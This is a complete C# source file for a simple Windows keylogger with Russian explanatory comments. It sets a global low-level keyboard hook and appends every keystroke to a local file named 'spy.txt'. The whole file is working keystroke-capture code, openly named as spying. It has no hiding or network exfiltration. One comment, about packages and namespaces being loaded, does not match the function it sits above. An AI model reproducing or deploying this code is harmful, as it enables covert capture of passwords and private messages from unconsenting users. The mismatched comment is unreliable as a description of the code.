using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;   //Система вызывает эту функцию каждый раз, когда собирается вставить новое событие ввода с клавиатуры в очередь ввода данных потока
    private static IntPtr _hookID = IntPtr.Zero;    //для хранения значения указателя в типе без указателя(в "безопасном" типе данных)

    public static void Main()
    {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    //Эти функции позволяют пользователям устанавливать действия, которые необходимо выполнить до того, как пакеты будут присоединены / отсоединены, а пространства имен (не) загружены.
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);  //обработка событий ввода

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) //обрабатывает обратный вызов после прерывания
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            File.AppendAllText(@"spy.txt", ((Keys)vkCode).ToString() + " ");
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    //устанавливает фильтр - процедуру, чтобы контролировать некоторые типы событий в системе
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    //удаляет подключаемую процедуру, установленную в цепочку hook-точек функцией SetWindowsHookEx.
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    //передает информацию hook-точки в следующую подключаемую процедуру в текущей цепочке hook-точек
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    //создаем прототип функции для того, чтобы функция имела тип и была реализована проверка типов при передаче параметров. GetModuleHandle получает указатель на DLL:
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}